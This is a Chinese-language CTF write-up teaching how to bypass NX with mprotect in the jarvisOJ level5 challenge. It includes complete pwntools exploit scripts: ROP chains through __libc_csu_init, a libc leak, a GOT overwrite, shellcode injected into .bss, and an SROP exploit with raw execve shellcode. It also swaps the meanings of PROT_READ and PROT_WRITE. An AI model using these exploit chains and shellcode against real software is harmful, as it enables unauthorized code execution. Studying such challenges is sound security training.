# 附件
链接: [https://pan.baidu.com/s/1DPNwOCC-K0QkeP6cLkyS5g](https://pan.baidu.com/s/1DPNwOCC-K0QkeP6cLkyS5g)  密码: 3g0o

--来自百度网盘超级会员V4的分享

# 前言
现在的大部分程序都会在编译时开启NX保护，这样我们就无法向stack上注入shellcode从而获得一个shell；但是我们可以使用mprotect修改某个程序段的权限从而让这个段可执行，我们使用下面的题目来举个例子：[https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ/jarvisOJ_level5](https://github.com/bash-c/pwn_repo/tree/master/jarvisOJ/jarvisOJ_level5)

参考资料：[https://www.dazhuanlan.com/2019/12/19/5dfb1fdeb7ee5/](https://www.dazhuanlan.com/2019/12/19/5dfb1fdeb7ee5/)

> 之前学的__libc_csu_init全忘完了，看了好长时间才想起来......
>

# 示例
文件下载下来按照惯例检查一下文件的保护：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623312426167-209eb77f-3e13-4bc9-ba92-3d930175ad06.png)

为了方便之后的调试，这里选择关闭Linux的ALSR：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623312445342-05ca4b60-9548-46c4-a7d8-1d488bbbd021.png)

其实这道题是完全可以使用ret2__libc_csu_init加上system("/bin/sh\x00")来做，但是现在我们提一个要求：“假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。”

> 当然这个程序并没有加什么类似于sandbox之类的保护，但是为了凸显mprotect在这道题的用法，我们默认这两个函数已经被ban
>

这里选用函数mprotect来更改bss的权限，看一下更改之前和之后的效果，更改之前：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623312825943-40df5f1c-8848-40e6-84f7-fab6d2033f0f.png)

更改之后：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623312982676-7adbbde5-b5a9-4ce4-b440-c8cc56f55091.png)

从这两张图中可以看出，程序的data段已经可以变为可执行（注意：bss段只是程序data段的一小部分）。言归正传，先来看一下程序的main吧，main函数很简单：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623313219156-2124fb07-1b66-4f2c-9da1-07f7f3108df7.png)

进入程序的vulnerable_function函数：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623313270853-4bae1a71-19fc-477e-ba69-742e66695e09.png)

有一个stack overflow，另外程序中没有system函数和"/bin/sh\x00"字符串。常规思路，在泄露libc的基地址之前看一下程序中可以使用的gadget：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623390333590-07544557-86a7-49d6-b7f8-8db4d692799f.png)

这个程序的gadget比较少，想要劫持程序流的话可能不太容易，但是这个程序是64位程序我们可以使用ret2__libc_csu_init，其核心在于每个ELF 64-bit文件中都肯定有这样一段gadget：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623390544148-221107c5-2c45-442f-b544-3b47763a692a.png)

首先利用程序的栈溢出布置stack并将程序的流程劫持到__libc_csu_init的0x4006AA地址处：

```python
pop_rdi_ret=0x4006b3 #rdi, rsi, rdx
pop_rsi_r15_ret=0x4006b1
pop_rbx_rbp_r12_r13_r14_r15_ret=0x4006AA
mov_gadget=0x400690
write_plt_addr=elf.plt['write']
write_got_addr=elf.got['write']
print hex(write_plt_addr)
print hex(write_got_addr)
main_addr=0x40061A
#gdb.attach(p)
p.recvuntil('Input:\n')
payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got_addr)+p64(0x8)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
#payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)+p64(0xdeadbeef)*6+p64(main_addr)
#payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_plt_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)
p.sendline(payload1)
```

> 64位的ELF在默认情况下的传参方式是：
>
> 当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9；当参数为7个以上时， 前6个与前面一样， 但后面的依次放入栈中，即和32位程序一样。
>

其实我们可以使用逆向思维来解题，因为要泄露libc基地址肯定要泄露某个函数在程序运行时的真实地址，而且在这个程序中只有write函数具有打印地址的功能，所以选择使用write函数泄露地址。并且由于这个程序是64位的，所以要注意给write函数的传参方式：write($rdi,$rsi,$rdx)；但是程序中只有pop_rdi_ret这个gadget，没有pop_rsi_ret和pop_rdx_ret的gadget，使用__libc_csu_init可以帮我门走出困境，重点内容都标记到下面的代码框中了：

```c
.text:0000000000400690 loc_400690:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400690                 mov     rdx, r13
.text:0000000000400693                 mov     rsi, r14               #可以通过控制r14寄存器间接控制rsi寄存器
.text:0000000000400696                 mov     edi, r15d			  #可以通过控制r15寄存器的低32位间接控制rdi寄存器的低32位
.text:0000000000400699                 call    qword ptr [r12+rbx*8]  #可以令rbx==0，通过控制r12寄存器调用(call)某个函数
.text:000000000040069D                 add     rbx, 1
.text:00000000004006A1                 cmp     rbx, rbp
.text:00000000004006A4                 jnz     short loc_400690       #rbx和rbp“不相等则跳转”（继续从0x400690地址处执行）
.text:00000000004006A6
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j
.text:00000000004006A6                 add     rsp, 8
.text:00000000004006AA                 pop     rbx                    #这里可以通过pop来控制rbx、rbp、r12、r13、r14、r15寄存器
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn
```

先来看一下payload1，我们分段来看：

```python
payload1='a'*136 #栈溢出
payload1+=p64(pop_rbx_rbp_r12_r13_r14_r15_ret) #劫持程序流到pop_gadgets
payload1+=p64(0)+p64(1) #为了实现有且只有一次跳转，控制rbx==0，rbp==1；另外注意gadgets中有add rbx,1
payload1+=p64(write_got_addr)+p64(0x8)+p64(write_got_addr)+p64(0x1) #控制r12==write_got_addr;r13==0x8;r14==write_got_addr;r15==0x1
payload1+=p64(mov_gadget)   										#间接控制：call write_got_addr;rdx==0x8;rsi==write_got_addr;edi==0x1
    																#实现：write(0x1,write_got_addr,0x8)
payload1+=p64(0xdeadbeef)*7+p64(main_addr)                          #call write后由于不跳转会继续执行如下汇编：
################################################################################################################################################
.text:00000000004006A6 loc_4006A6:                             ; CODE XREF: __libc_csu_init+36↑j
.text:00000000004006A6                 add     rsp, 8               #p64(0xdeadbeef)抵消add rsp,8
.text:00000000004006AA                 pop     rbx                  #rbx、rbp、r12、r13、r14、r15经过pop后为0xdeadbeef
.text:00000000004006AB                 pop     rbp
.text:00000000004006AC                 pop     r12
.text:00000000004006AE                 pop     r13
.text:00000000004006B0                 pop     r14
.text:00000000004006B2                 pop     r15
.text:00000000004006B4                 retn                         #p64(main_addr):pop rip，执行main函数
```

强调一点，payload1中p64(0xdeadbeef)的数量为7，不能多也不能少，其中第一个p64(0xdeadbeef)的作用是抵消“add rsp,8”对stack的影响（栈的生长方向是由高地址到低地址【x86、x64】），再补充一个错误的payload：

```python
payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_plt_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623396906959-e6713489-b988-4cf0-a044-9c59576e6b79.png)

如上图所示，call是一个错误的地址，正常的payload如下：

```python
payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)
```

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623396819347-25bf33d3-349f-495f-9275-0ec2935a1d45.png)

**<font style="color:#F5222D;">注意这里的call一定是函数的got地址而不是函数的plt地址，因为call是将当前RIP的下一条指令压入stack然后jmp到对应的地址，下图箭头指向的地方是一条jmp指令，我们不能去call一条jmp指令。（</font>****<font style="color:#F5222D;">plt中存放的是jmp指令）</font>**

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623397714399-9b620723-1ca0-43b7-aa58-aa156b2fdc13.png)

回到正题，这样我们就可以泄露出write函数的真实地址进而泄露出libc基地址：

```python
p.sendline(payload1)
leak_write_real_addr=u64(p.recv(8))
#print hex(leak_write_real_addr)
libc_base=leak_write_real_addr-libc.symbols['write']
print hex(libc_base)
```

仿照之前的步骤，return到gadgets调用read函数向空内存的bss段读入shellcode：

```python
read_got_addr=elf.got['read']
bss_addr=elf.bss()
print hex(bss_addr)
payload2='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(bss_addr)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Input:\n')
p.sendline(payload2)
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)
```

我们都知道got表中存放的是函数的真实地址，由于要调用mprotect函数，因此我们可以将mprotect的真实地址写入到空的got中，这里选取elf.got['__gmon_start__']：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623400487615-a221bc55-041d-4f29-8051-10afe1cd2766.png)

当某个函数调用之后，其真实地址会写入到got表中，所以上图一看就知道__gmon_start__没有执行过，所以说将其内存覆盖也没有什么关系。

> 《Linux 程序符号__gmon_start__》：[https://www.jianshu.com/p/ebd516326a36](https://www.jianshu.com/p/ebd516326a36)
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623400729364-3ed0226e-7cc6-4514-bb90-480cbd4def44.png)

> got表中存放的是函数的真实地址。
>

```python
target_got=elf.got['__gmon_start__']
print target_got
#payload3='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(target_plt)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
payload3='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(target_got)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Input:\n')
p.sendline(payload3)
#gdb.attach(p)
target=libc_base+libc.symbols['mprotect']
print hex(target)
p.sendline(p64(target))
```

之后执行__gmon_start__，因为got['__gmon_start__']已经被更改为mprotect，所以这次执行相当于执行mprotect【更改data段的权限为0x7（可读可写可执行）（r=4，w=2，x=1）】：

```python
#gdb.attach(p)
payload4='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(target_got)+p64(0x7)+p64(0x1000)+p64(bss_addr-0xa88)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
p.sendline(payload4)
```

> 程序段的映射是由mmap实现的，data段也不例外。
>

这里补充一下有关mprotect的知识，其函数原型如下：

```c
#include <unistd.h>
#include <sys/mmap.h>
int mprotect(const void *start, size_t len, int prot);
```

作用：mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。

> prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：
>
> 1）PROT_READ：表示内存段内的内容可写；2）PROT_WRITE：表示内存段内的内容可读；
>
> 3）PROT_EXEC：表示内存段中的内容可执行；4）PROT_NONE：表示内存段中的内容无法访问；
>

需要指出的是，**<font style="color:#F5222D;">区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍：</font>**

> [https://man7.org/linux/man-pages/man2/mprotect.2.html](https://man7.org/linux/man-pages/man2/mprotect.2.html)
>

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623402019544-f123475f-23a5-400d-9e1a-f89e003e6741.png)

返回值：如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量。

错误的原因主要有以下几个：

1）EACCES：该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。

2）EINVAL：start 不是一个有效的指针，指向的不是某个内存页的开头。

3）ENOMEM：内核内部的结构体无法分配。

4）ENOMEM：进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。 

**<font style="color:#F5222D;">如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生SIGSEGV（Segmentation fault，段错误）信号，并且终止该进程。</font>**

回到这道题，显而易见mprotect的第一个参数为data段的首地址即bss_addr-0xa88，第二个参数len包含整个data段就行：0x1000，第三个参数设置为0x7即可。

```python
payload4='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(target_got)+p64(0x7)+p64(0x1000)+p64(bss_addr-0xa88)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
```

> 另：因为内存是要求是以基页（4KB==0x1000Byte）为单位访问，所以mprotect的第一、第二个参数必须是0x1000的倍数。
>

获取Linux 内存页（基页）大小的命令为getconf PAGE_SIZE：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1623402456899-91c70e43-1dd7-404a-b1ef-670bf98a609d.png)

最后栈溢出执行shellcode拿到shell：

```python
p.recvuntil('Input:\n')
payload5='a'*136+p64(bss_addr)
#gdb.attach(p)
p.sendline(payload5)
p.sendline('ls')
p.interactive()
```

完整exp如下：

```python
from pwn import *
context.log_level='debug'
context.arch='amd64' #shellcode

p=process('./level3_x64')
elf=ELF('./level3_x64')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

'''
pwndbg> cyclic -l 0x6261616a
136
ubuntu@ubuntu:~/Desktop/CTF$ ROPgadget --binary level3_x64 --only "pop|ret"
Gadgets information
============================================================
0x00000000004006ac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ae : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006b0 : pop r14 ; pop r15 ; ret
0x00000000004006b2 : pop r15 ; ret
0x00000000004006ab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006af : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400550 : pop rbp ; ret
0x00000000004006b3 : pop rdi ; ret
0x00000000004006b1 : pop rsi ; pop r15 ; ret
0x00000000004006ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400499 : ret

Unique gadgets found: 11
ubuntu@ubuntu:~/Desktop/CTF$ 
'''
pop_rdi_ret=0x4006b3 #rdi, rsi, rdx
pop_rsi_r15_ret=0x4006b1
pop_rbx_rbp_r12_r13_r14_r15_ret=0x4006AA
mov_gadget=0x400690
write_plt_addr=elf.plt['write']
write_got_addr=elf.got['write']
print hex(write_plt_addr)
print hex(write_got_addr)
main_addr=0x40061A
#gdb.attach(p)
p.recvuntil('Input:\n')
payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got_addr)+p64(0x8)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
#payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(write_got_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)+p64(0xdeadbeef)*6+p64(main_addr)
#payload1='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(write_plt_addr)+p64(0x10)+p64(write_got_addr)+p64(0x1)+p64(mov_gadget)
p.sendline(payload1)
leak_write_real_addr=u64(p.recv(8))
libc_base=leak_write_real_addr-libc.symbols['write']
print hex(libc_base)

#gdb.attach(p)
read_got_addr=elf.got['read']
bss_addr=elf.bss()
print hex(bss_addr)
payload2='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(bss_addr)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Input:\n')
p.sendline(payload2)
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)

target_got=elf.got['__gmon_start__']
print target_got
#payload3='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(target_plt)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
payload3='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(read_got_addr)+p64(0x100)+p64(target_got)+p64(0x0)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Input:\n')
p.sendline(payload3)
#gdb.attach(p)
target=libc_base+libc.symbols['mprotect']
print hex(target)
p.sendline(p64(target))

#gdb.attach(p)
payload4='a'*136+p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(target_got)+p64(0x7)+p64(0x1000)+p64(bss_addr-0xa88)+p64(mov_gadget)+p64(0xdeadbeef)*7+p64(main_addr)
p.sendline(payload4)

p.recvuntil('Input:\n')
payload5='a'*136+p64(bss_addr)
#gdb.attach(p)
p.sendline(payload5)
p.sendline('ls')
p.interactive()
```

---

上一道题的SROP-smallest也可以使用mprotect更改权限，感兴趣可以试试：

```python
###https://bestwing.me/2017-360chunqiu-online.html
# -*-coding:utf-8-*-
__author__ = 'joker'

from pwn import *
context.log_level = "debug"
context.arch = "amd64"

r = process("./smallest")

syscall_addr = 0x4000BE
start_addr = 0x4000B0

payload = p64(start_addr)
payload += p64(start_addr)#fill
payload += p64(start_addr)#fill
r.send(payload)
raw_input("joker")

#write infor leak
r.send("\xb3")#write 2 start_addr last byte
data = r.recv(8)
data = r.recv(8)
stack_addr = u64(data)
print "[*]:stack:{0}".format(hex(stack_addr))

frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = stack_addr
frame.rdx = 0x300
frame.rsp = stack_addr
frame.rip = syscall_addr

payload = p64(start_addr)
payload += p64(syscall_addr)
payload += str(frame)
r.send(payload)

raw_input("joker")
payload = p64(0x4000B3)#fill
payload += p64(0x4000B3)#fill
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn

frame = SigreturnFrame()
frame.rax = constants.SYS_mprotect
frame.rdi = (stack_addr&0xfffffffffffff000)
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = stack_addr + 0x108
frame.rip = syscall_addr
payload = p64(start_addr)
payload += p64(syscall_addr)
payload += str(frame)

payload += p64(stack_addr + 0x108 + 8)
#payload += cyclic(0x100)#addr ====> start_addr + 0x108
payload += "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"#shellcode

r.send(payload)

raw_input("joker")
payload = p64(0x4000B3)#fill
payload += p64(0x4000B3)#fill
payload = payload[:15]
r.send(payload)#set rax=sys_rt_sigreturn

r.interactive()
```

